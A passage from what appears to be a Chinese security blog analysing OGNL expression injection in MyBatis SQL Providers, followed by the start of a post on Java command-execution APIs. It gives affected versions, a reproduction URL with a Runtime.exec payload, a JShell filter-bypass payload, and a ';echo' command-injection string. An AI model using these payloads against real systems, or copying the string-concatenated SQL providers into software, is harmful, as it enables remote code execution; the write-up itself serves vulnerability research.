class="hljs-attr">value</span>=<span class="hljs-string">&quot;4&quot;</span> /&gt;</span><br></code></pre></td></tr></table></figure><p>但实际上并非如此，mybatis对于bind中value属性的OGNL解析流程是这样的，</p><p>首先利用OGNL表达式解析器解析value的值，此时值单纯为name变量，即：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs XML"><span class="hljs-tag">&lt;<span class="hljs-name">bind</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;likename&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;name&quot;</span> /&gt;</span><br></code></pre></td></tr></table></figure><p>然后得到值，**${@java.lang.Math@min(4,10)}，**然后将其赋给bind标签value属性中的name变量，即：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs XML"><span class="hljs-tag">&lt;<span class="hljs-name">bind</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;likename&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;$&#123;@java.lang.Math@min(4,10)&#125;&quot;</span> /&gt;</span><br></code></pre></td></tr></table></figure><p>这也就导致我们无法令传入的变量的值被OGNL表达式解析器来进行解析，也就无法实现OGNL表达式注入</p><ol><li><strong>${param} 参数中</strong></li></ol><p>${param} 和 【bind标签里的 value属性】同理，虽然可以传值， 但是存在解析顺序问题，同样无法实现OGNL表达式注入</p><p>比如存在以下select标签 ：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs SQL"><span class="hljs-operator">&lt;</span><span class="hljs-keyword">select</span> id<span class="hljs-operator">=</span>&quot;findTeacherByName&quot; resultMap<span class="hljs-operator">=</span>&quot;BaseResultMap&quot; parameterType<span class="hljs-operator">=</span>&quot;com.example.mybatis.entity.Teacher&quot;<span class="hljs-operator">&gt;</span><br><span class="hljs-keyword">select</span> id,email <span class="hljs-keyword">from</span> Teacher <span class="hljs-keyword">where</span> name <span class="hljs-operator">=</span> $&#123;name&#125;;<br><span class="hljs-operator">&lt;</span><span class="hljs-operator">/</span><span class="hljs-keyword">select</span><span class="hljs-operator">&gt;</span><br></code></pre></td></tr></table></figure><p>传入的name为：**${@java.lang.Math@min(4,10)}**</p><p>那么其解析过程为：</p><p>首先利用OGNL解析器解析**${}**标签里的内容，解析完毕以后得到name的变量，传入SQL中：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs SQL"><span class="hljs-keyword">select</span> id,email <span class="hljs-keyword">from</span> Teacher <span class="hljs-keyword">where</span> name <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;$&#123;@java.lang.Math@min(4,10)&#125;&#x27;</span>;<br></code></pre></td></tr></table></figure><ol><li><strong>Provider实现类中的拼接到*<em>**SQL**</em>*里的变量</strong></li></ol><p>在注解部分里，曾经提到：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs Java">  <span class="hljs-keyword">public</span> String <span class="hljs-title function_">findTeacherByName</span><span class="hljs-params">(Map&lt;String, Object&gt; map)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> (String) map.get(<span class="hljs-string">&quot;name&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SQL</span>() &#123;<br>            &#123;<br>                SELECT(<span class="hljs-string">&quot;id,email&quot;</span>);<br>                FROM(<span class="hljs-string">&quot;Teacher&quot;</span>);<br>                <span class="hljs-keyword">if</span>(map.get(<span class="hljs-string">&quot;id&quot;</span>)!=<span class="hljs-literal">null</span>)            <br>                WHERE(<span class="hljs-string">&quot;name=#&#123;name&#125;&quot;</span>);<br>            &#125;<br>        &#125;.toString();<br>        <span class="hljs-keyword">return</span> s;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到，返回值实际上就是一个SQL语句</p><p>没错，Provider其实就是要返回一个SQL字符串，只不过用了一些关键字做格式化而已，其实不使用也可以，比如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs Java">  <span class="hljs-keyword">public</span> String <span class="hljs-title function_">findTeacherByName</span><span class="hljs-params">(Map&lt;String, Object&gt; map)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> (String) map.get(<span class="hljs-string">&quot;name&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SQL</span>() &#123;<br>            &#123;<br>                SELECT(<span class="hljs-string">&quot;id,email&quot;</span>);<br>                FROM(<span class="hljs-string">&quot;Teacher&quot;</span>);<br>                <span class="hljs-keyword">if</span>(map.get(<span class="hljs-string">&quot;id&quot;</span>)!=<span class="hljs-literal">null</span>)            <br>                WHERE(<span class="hljs-string">&quot;name=&quot;</span> + name);<br>            &#125;<br>        &#125;.toString();<br>        <span class="hljs-keyword">return</span> s;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>甚至可以使用String字符串拼接SQL语句：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs Java">  <span class="hljs-keyword">public</span> String <span class="hljs-title function_">findTeacherByName</span><span class="hljs-params">(Map&lt;String, Object&gt; map)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> (String) map.get(<span class="hljs-string">&quot;name&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;select id,email from Teacher where name = &quot;</span> + name;<br>        <span class="hljs-keyword">return</span> sql;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>亦或者使用String.format来处理：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">findTeacherByName</span><span class="hljs-params">(Map&lt;String, Object&gt; map)</span> &#123;<br>     <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> (String) map.get(<span class="hljs-string">&quot;name&quot;</span>);<br>   <span class="hljs-type">String</span> <span class="hljs-variable">finalName</span> <span class="hljs-operator">=</span> String.format(<span class="hljs-string">&quot; name in (%s)&quot;</span>, name);<br>   <span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SQL</span>() &#123;&#123;<br>     SELECT(<span class="hljs-string">&quot;id,email&quot;</span>);<br>     FROM(<span class="hljs-string">&quot;Teacher&quot;</span>);<br>     WHERE(finalName);<br>     ORDER_BY(<span class="hljs-string">&quot;id desc&quot;</span>);<br>   &#125;&#125;.toString();<br>   System.out.println(sql);<br>   <span class="hljs-keyword">return</span> sql;<br> &#125;<br></code></pre></td></tr></table></figure><p>有时候复杂的语句还可以使用StringBuilder或者StringBuffer拼接，如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">countUserByRolePM</span><span class="hljs-params">(<span class="hljs-keyword">final</span> UserVO userVO)</span><br>    &#123;<br>        <span class="hljs-type">StringBuffer</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>();<br>        sb.append(<span class="hljs-string">&quot;SELECT count(*) FROM ( &quot;</span>);<br>        sb.append(<span class="hljs-string">&quot; SELECT A.*,count(P.Id) FROM (&quot;</span>);<br>        sb.append(<span class="hljs-string">&quot; SELECT U.id,U.name,DD.referrer,U.mobilePhone ,U.country ,U.city,U.goodAtIndustry,U.englishAbility,U.goodAtArea,U.state,U.createTime,U.modifyTime  FROM T_USER U LEFT JOIN T_USER_ROLE UR ON U.id = UR.userId &quot;</span> +<br>                <span class="hljs-string">&quot; LEFT JOIN (SELECT A.id,B.name as referrer FROM T_USER AS  A INNER JOIN T_USER as B ON A.referrer = B.id) as DD ON DD.id = U.id WHERE 1=1 &quot;</span>);<br><br>        sb.append(<span class="hljs-string">&quot; AND UR.roleId in (&quot;</span>);<br><br>        String[] roleids = userVO.getParaRoleIDS().split(<span class="hljs-string">&quot;,&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (roleids != <span class="hljs-literal">null</span>)&#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span> ; i&lt; roleids.length ; i ++)&#123;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> roleids[i];<br>                <span class="hljs-keyword">if</span>(i != roleids.length -<span class="hljs-number">1</span>)&#123;<br>                    sb.append(<span class="hljs-string">&quot;&#x27;&quot;</span> + s + <span class="hljs-string">&quot;&#x27;&quot;</span> + <span class="hljs-string">&quot;,&quot;</span>);<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    sb.append(<span class="hljs-string">&quot;&#x27;&quot;</span> + s + <span class="hljs-string">&quot;&#x27;&quot;</span>);<br>                &#125;<br>            &#125;<br>        &#125;<br>        sb.append(<span class="hljs-string">&quot;)&quot;</span>);<br><br>        <span class="hljs-keyword">if</span>(!StringUtils.isEmpty(userVO.getName()))&#123;<br>            sb.append(<span class="hljs-string">&quot; AND U.name LIKE CONCAT(&#x27;%&#x27;,#&#123;name&#125;,&#x27;%&#x27;)&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span>(!StringUtils.isEmpty(userVO.getMobilePhone()))&#123;<br>            sb.append(<span class="hljs-string">&quot; AND U.mobilePhone = #&#123;mobilePhone&#125;&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span>(!StringUtils.isEmpty(userVO.getCity()))&#123;<br>            sb.append(<span class="hljs-string">&quot; AND U.city LIKE CONCAT(&#x27;%&#x27;,#&#123;city&#125;,&#x27;%&#x27;)&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span>(!StringUtils.isEmpty(userVO.getRegion()))&#123;<br>            sb.append(<span class="hljs-string">&quot; AND U.region LIKE CONCAT(&#x27;%&#x27;,#&#123;region&#125;,&#x27;%&#x27;)&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span>(!StringUtils.isEmpty(userVO.getPlatformLevel()))&#123;<br>            sb.append(<span class="hljs-string">&quot; and U.platformLevel =  #&#123;platformLevel&#125;&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span>(!StringUtils.isEmpty(userVO.getGoodAtIndustry()))&#123;<br>            sb.append(<span class="hljs-string">&quot; and find_in_set(#&#123;goodAtIndustry&#125;,U.goodAtIndustry)&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span>(!StringUtils.isEmpty(userVO.getState()))&#123;<br>            sb.append(<span class="hljs-string">&quot; and U.state = #&#123;state&#125;&quot;</span>);<br>        &#125;<br>        sb.append(<span class="hljs-string">&quot; GROUP BY U.id&quot;</span>);<br>        sb.append(<span class="hljs-string">&quot; ) A&quot;</span>);<br>        sb.append(<span class="hljs-string">&quot; LEFT JOIN T_PROJECT P ON P.pmId = A.id&quot;</span>);<br>        sb.append(<span class="hljs-string">&quot; GROUP BY A.id&quot;</span>);<br>        sb.append(<span class="hljs-string">&quot; ORDER BY A.modifyTime DESC&quot;</span>);<br>        sb.append(<span class="hljs-string">&quot;) as A&quot;</span>);<br>        <span class="hljs-keyword">return</span> sb.toString();<br>    &#125;<br></code></pre></td></tr></table></figure><p>这样形成的SQL语句，实际上就是相当于生成了一个XML文件：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs XML"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;findTeacherByName&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;BaseResultMap&quot;</span> <span class="hljs-attr">parameterType</span>=<span class="hljs-string">&quot;com.example.mybatis.entity.Teacher&quot;</span>&gt;</span><br>select id,email from Teacher where name = 传入的name值<br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></td></tr></table></figure><p>那这样的方式和<strong>bind标签里的 value 属性</strong>或者**${param} 参数中**有没有区别呢？</p><p>当然有区别，并且这种区别是本质的</p><p>正是前文中提到的：<strong>解析顺序</strong></p><p>这种形成的SQL语句会首先进行OGNL表达式，然后再执行查询。</p><p>以下面的Provider为例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs Java">  <span class="hljs-keyword">public</span> String <span class="hljs-title function_">findTeacherByName</span><span class="hljs-params">(Map&lt;String, Object&gt; map)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> (String) map.get(<span class="hljs-string">&quot;name&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SQL</span>() &#123;<br>            &#123;<br>                SELECT(<span class="hljs-string">&quot;id,email&quot;</span>);<br>                FROM(<span class="hljs-string">&quot;Teacher&quot;</span>);<br>                <span class="hljs-keyword">if</span>(map.get(<span class="hljs-string">&quot;id&quot;</span>)!=<span class="hljs-literal">null</span>)            <br>                WHERE(<span class="hljs-string">&quot;name=&quot;</span> + name);<br>            &#125;<br>        &#125;.toString();<br>        <span class="hljs-keyword">return</span> s;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>如果我们传入name的值为：**${@java.lang.Math@min(4,10)}**</p><p>其流程是这样的：</p><p>首先生成了SQL语句为：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs SQL"><span class="hljs-keyword">select</span> id,email <span class="hljs-keyword">from</span> Teacher <span class="hljs-keyword">where</span> name <span class="hljs-operator">=</span> $&#123;<span class="hljs-variable">@java</span>.lang.Math<span class="hljs-variable">@min</span>(<span class="hljs-number">4</span>,<span class="hljs-number">10</span>)&#125;;<br></code></pre></td></tr></table></figure><p>经过一系列的传递，<strong>相当于生成（实际上并未生成，直接解析的）</strong>了一个如下的XML文件：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs SQL"><span class="hljs-operator">&lt;</span><span class="hljs-keyword">select</span> id<span class="hljs-operator">=</span>&quot;findTeacherByName&quot; resultMap<span class="hljs-operator">=</span>&quot;BaseResultMap&quot; parameterType<span class="hljs-operator">=</span>&quot;com.example.mybatis.entity.Teacher&quot;<span class="hljs-operator">&gt;</span><br><span class="hljs-keyword">select</span> id,email <span class="hljs-keyword">from</span> Teacher <span class="hljs-keyword">where</span> name <span class="hljs-operator">=</span> $&#123;<span class="hljs-variable">@java</span>.lang.Math<span class="hljs-variable">@min</span>(<span class="hljs-number">4</span>,<span class="hljs-number">10</span>)&#125;;<br><span class="hljs-operator">&lt;</span><span class="hljs-operator">/</span><span class="hljs-keyword">select</span><span class="hljs-operator">&gt;</span><br></code></pre></td></tr></table></figure><p>然后进行OGNL表达式解析：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs SQL"><span class="hljs-operator">&lt;</span><span class="hljs-keyword">select</span> id<span class="hljs-operator">=</span>&quot;findTeacherByName&quot; resultMap<span class="hljs-operator">=</span>&quot;BaseResultMap&quot; parameterType<span class="hljs-operator">=</span>&quot;com.example.mybatis.entity.Teacher&quot;<span class="hljs-operator">&gt;</span><br><span class="hljs-keyword">select</span> id,email <span class="hljs-keyword">from</span> Teacher <span class="hljs-keyword">where</span> name <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;4&#x27;</span>;<br><span class="hljs-operator">&lt;</span><span class="hljs-operator">/</span><span class="hljs-keyword">select</span><span class="hljs-operator">&gt;</span><br></code></pre></td></tr></table></figure><p>解析完毕以后得到name的变量，传入SQL中：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs SQL"><span class="hljs-keyword">select</span> id,email <span class="hljs-keyword">from</span> Teacher <span class="hljs-keyword">where</span> name <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;4&#x27;</span>;<br></code></pre></td></tr></table></figure><p>这也就导致了OGNL表达式注入</p><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><ul><li>mybatis-spring-boot-starter >=2.0.1（mybatis-spring-boot-starter组件从2.0.1版本开始支持Provider动态SQL）</li></ul><p>或者</p><ul><li>Mybatis 全版本</li></ul><p>或者</p><ul><li>mybatis-plus-boot-starter >=3.1.1</li></ul><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>如果在mybatis中存在某个SelectProvider（或者其他的Provider）的方法实例如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs Java">  <span class="hljs-keyword">public</span> String <span class="hljs-title function_">findTeacherByName</span><span class="hljs-params">(Map&lt;String, Object&gt; map)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> (String) map.get(<span class="hljs-string">&quot;name&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SQL</span>() &#123;<br>            &#123;<br>                SELECT(returnSql);<br>                FROM(<span class="hljs-string">&quot;Teacher&quot;</span>);<br>                WHERE(<span class="hljs-string">&quot;name=&quot;</span> + name);<br>            &#125;<br>        &#125;.toString();<br>        <span class="hljs-keyword">return</span> s;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>对应controller如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-meta">@RequestMapping(&quot;selectUserByName&quot;)</span><br><span class="hljs-keyword">public</span> Teacher <span class="hljs-title function_">getUserOne</span><span class="hljs-params">(String id,String name)</span>&#123;<br><br>    Teacher tea=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Teacher</span>();<br>    tea.setId(id);<br>    tea.setName(name);<br>    Teacher teacher=userService.findTeacherByName(tea);<br>    <span class="hljs-keyword">return</span> teacher;<br><br>&#125;<br>http:<span class="hljs-comment">//localhost:8080/selectUserByName?id=7&amp;name=%24%7B@java.lang.Runtime@getRuntime().exec(&quot;open /System/Applications/Calculator.app&quot;)%7D</span><br></code></pre></td></tr></table></figure><h2 id="漏洞利用限制"><a href="#漏洞利用限制" class="headerlink" title="漏洞利用限制"></a>漏洞利用限制</h2><p>不同版本的mybatis-spring-boot-starter引用了不同的Mybatis版本，而不同的Mybatis版本又使用了不同的OGNL组件版本</p><p>在 mybatis-spring-boot-starter 组件的<strong>2.0.1</strong>版本中，其引用的Mybatis版本为<strong>3.5.1</strong>，对应的OGNL版本为<strong>3.2.10</strong>，在这个版本中，并未对传入的OGNL表达式反射调用的类进行限制，而在高版本中进行了限制（如<strong>mybatis3.5.9</strong>，具体从哪个版本开始限制的，没有调查），因此想要在高版本中进行绕过限制，需要一定的技巧，这里只提供一种Java环境大于等于JDK9的通杀payload ，小于9的也可以绕过，具体可以思考从编码入手。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Java">$&#123;<span class="hljs-meta">@jdk</span>.jshell.JShell<span class="hljs-meta">@create()</span>.eval(<span class="hljs-string">&#x27;java.lang.Runtime.getRuntime().exec(&quot;open /System/Applications/Calculator.app&quot;)&#x27;</span>)&#125;<br></code></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>该漏洞为特殊场景下的利用，只有存在SQL注入的时候，此漏洞才会存在</p><p>因此可能遇到的情景比较少</p><p>是一种特定场景下mybatis SQL到RCE的补充利用\</p><p>转载自<a href="https://www.cnpanda.net/sec/1227.html">Mybatis 从SQL注入到OGNL注入 - panda | 热爱安全的理想少年 (cnpanda.net)</a></p></script></p>]]></content>
    
    
    
    <tags>
      
      <tag>Java中间件漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java下多种执行命令的姿势及问题</title>
    <link href="/2023/11/07/Java%E4%B8%8B%E5%A4%9A%E7%A7%8D%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E7%9A%84%E5%A7%BF%E5%8A%BF%E5%8F%8A%E9%97%AE%E9%A2%98/"/>
    <url>/2023/11/07/Java%E4%B8%8B%E5%A4%9A%E7%A7%8D%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E7%9A%84%E5%A7%BF%E5%8A%BF%E5%8F%8A%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Java 代码审计当中，关于命令执行，我们主要关注的是函数 Runtime.getRuntime().exec(command) &amp;&amp; new ProcessBuilder(command).start()</p><p>在参数 command 可控的情况下，一般就会存在命令执行的问题，但是也会存在这种问题，有时候明明参数可控，但是无法成功执行命令，以及复杂的shell 命令，例如带有 | 、&lt;、&gt;、$ 等符号的命令没办法正常执行。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">Command = <span class="hljs-string">&quot;ping 127.0.0.1&quot;</span>+request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>Runtime.getRuntime().exec(command);<br></code></pre></td></tr></table></figure><p>这样的一段代码是存在命令注入漏洞的吗？粗略一看，存在命令执行函数，command 获取从外部传入的 cmd ，应该是存在命令注入漏洞的。但是并没有执行成功，并不存在命令执行漏洞。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">linux_cmd</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span><span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-string">&quot;;echo 1 &gt; 1.txt&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">Command</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;ping 127.0.0.1&quot;</span>+cmd;<br>        Runtime.getRuntime().exec(Command);<br>        <span class="hljs-comment">//Runtime.getRuntime().exec(new String[]&#123;&quot;/bin/sh&quot;, &quot;-c&quot;, Command&#125;);</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>直接通过 Runtime.getRuntime().exec(Command); 没有成功创建 1.txt。通过 Runtime.getRuntime().exec(new String[]{“&#x2F;bin&#x2F;sh”, “-c”, Command}); 成功创建 1.txt。 于是尝试对 Runtime.getRuntime().exec(Command); 进行调试分析。</p><p>我们跟进 Runtime.getRuntime().exec() 发现会依据传入的参数类型，而选用不同的函数。</p><p><img src="/2023/11/07/Java%E4%B8%8B%E5%A4%9A%E7%A7%8D%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E7%9A%84%E5%A7%BF%E5%8A%BF%E5%8F%8A%E9%97%AE%E9%A2%98/image-20231107153505641.png" alt="image-20231107153505641"></p><h2 id="Runtime-getRuntime-exec-String-command）"><a href="#Runtime-getRuntime-exec-String-command）" class="headerlink" title="Runtime.getRuntime().exec(String command）"></a>Runtime.getRuntime().exec(String command）</h2><p>当传入的参数类型是 String ，会到 Process exec(String command) 这个构造方法进行处理，最后返回了 exec(command, null, null);</p><p>java.lang.Runtime#exec(java.lang.String)</p><p><img src="/2023/11/07/Java%E4%B8%8B%E5%A4%9A%E7%A7%8D%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E7%9A%84%E5%A7%BF%E5%8A%BF%E5%8F%8A%E9%97%AE%E9%A2%98/image-20231107153556997.png" alt="image-20231107153556997"></p><p>java.lang.Runtime#exec(java.lang.String, java.lang.String[], java.io.File)</p><p><img src="/2023/11/07/Java%E4%B8%8B%E5%A4%9A%E7%A7%8D%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E7%9A%84%E5%A7%BF%E5%8A%BF%E5%8F%8A%E9%97%AE%E9%A2%98/image-20231107153615442.png" alt="image-20231107153615442"></p><p>在这个地方我们注意到利用 StringTokenizer 对输入的 command 进行了处理</p><p>java.util.StringTokenizer#StringTokenizer(java.lang.String)</p><p><img src="/2023/11/07/Java%E4%B8%8B%E5%A4%9A%E7%A7%8D%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E7%9A%84%E5%A7%BF%E5%8A%BF%E5%8F%8A%E9%97%AE%E9%A2%98/image-20231107153635473.png" alt="image-20231107153635473"></p><p>会根据 \t\n\r\f 把传入的 command 分割</p><p><img src="/2023/11/07/Java%E4%B8%8B%E5%A4%9A%E7%A7%8D%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E7%9A%84%E5%A7%BF%E5%8A%BF%E5%8F%8A%E9%97%AE%E9%A2%98/image-20231107153701002.png" alt="image-20231107153701002"></p><p>java.lang.Runtime#exec(java.lang.String[], java.lang.String[], java.io.File)</p><p><img src="/2023/11/07/Java%E4%B8%8B%E5%A4%9A%E7%A7%8D%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E7%9A%84%E5%A7%BF%E5%8A%BF%E5%8F%8A%E9%97%AE%E9%A2%98/image-20231107153716620.png" alt="image-20231107153716620"></p><p>经过处理之后，最后实例化了 ProcessBuilder 来处理传入的 